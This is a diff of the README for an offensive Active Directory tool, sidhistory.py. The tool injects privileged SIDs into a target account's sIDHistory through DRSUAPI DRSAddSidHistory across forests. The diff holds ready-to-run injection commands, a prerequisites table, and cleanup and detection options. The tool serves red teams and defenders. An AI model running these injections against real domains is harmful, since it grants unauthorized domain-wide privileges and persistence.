@@ -18,50 +18,27 @@ pip install -r requirements.txt
 
 ---
 
-## Red Team — Injection
+## Red Team — DRSUAPI Injection
 
-### DRSUAPI Injection (Cross-Forest)
+### Cross-Forest SID Injection
 
-The core feature — injects a source user's SID into a target's `sIDHistory` via `DRSAddSidHistory` (opnum 20). This is the RPC call that Microsoft's ADMT uses for domain migrations, now available from Linux.
+The core feature — injects a source user's SID into a target's `sIDHistory` via `DRSAddSidHistory` (opnum 20). This is the RPC call that Microsoft's ADMT uses for domain migrations, now available from Linux. Bypasses the DC's SAM layer without patching memory (no mimikatz) and without offline ntds.dit access (no DSInternals).
 
 ```bash
 python3 sidhistory.py -d DST.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
     --target victim --source-user admin --source-domain SRC.LOCAL \
-    --method drsuapi \
     --src-username admin --src-password 'Pass123' --src-domain SRC.LOCAL
 ```
 
 ![DRSUAPI cross-forest injection](docs/drsuapi_injection.png)
-
-### Preset Injection
-
-Inject well-known privileged SIDs using built-in presets. 10 presets available: `domain-admins`, `enterprise-admins`, `schema-admins`, `administrators`, `domain-controllers`, `key-admins`, `enterprise-key-admins`, `group-policy-creators`, `krbtgt`, `administrator`.
-
-```bash
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
-    --target victim --preset domain-admins
-```
-
-![Preset injection](docs/preset_injection.png)
-
-### Direct SID Injection
-
-Inject any arbitrary SID directly.
-
-```bash
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
-    --target victim --sid S-1-5-21-xxx-512
-```
-
-![Direct SID injection](docs/direct_sid_injection.png)
 
 ### Dry Run
 
 Preview what would be injected without modifying AD.
 
 ```bash
-python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
-    --target victim --preset enterprise-admins --dry-run
+python3 sidhistory.py -d DST.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
+    --target victim --source-user admin --source-domain SRC.LOCAL --dry-run
 ```
 
 ![Dry run](docs/dry_run.png)
@@ -127,7 +104,7 @@ python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
 
 ### List Presets
 
-Show all available SID presets with their resolved SIDs for the target domain.
+Show well-known privileged SIDs for the target domain (useful for identifying attack artifacts in sIDHistory).
 
 ```bash
 python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
@@ -168,6 +145,15 @@ python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
 ```
 
 ![Remove specific SID](docs/remove_sid.png)
+
+### Bulk Clear
+
+Clear sIDHistory from multiple objects at once using a file.
+
+```bash
+python3 sidhistory.py -d CORP.LOCAL -u admin -p 'Pass123' --dc-ip 10.0.0.1 \
+    --targets-file users.txt --bulk-clear
+```
 
 ---
 
@@ -214,6 +200,18 @@ Client (Linux)                          Domain Controller
   │── DRSAddSidHistory (opnum 20) ───────►│  Inject SID into sIDHistory
   │◄── DRS_MSG_ADDSIDREPLY_V1 ───────────│  Win32 error code (0 = success)
 ```
+
+### Prerequisites for DRSUAPI Injection
+
+| Requirement | Details |
+|---|---|
+| Cross-forest trust | Source and destination must be in different forests |
+| Auditing on both DCs | `auditpol /set /category:"Account Management" /success:enable /failure:enable` |
+| Audit groups | Local groups `SRCDOM$$$` and `DSTDOM$$$` must exist on both DCs |
+| Source domain credentials | `--src-username`, `--src-password`, `--src-domain` |
+| Domain Admin on destination | The authenticated user must be DA in the target domain |
+
+See `docs/IMPLEMENTATION.md` for the full technical deep-dive.
 
 ## Detection
 
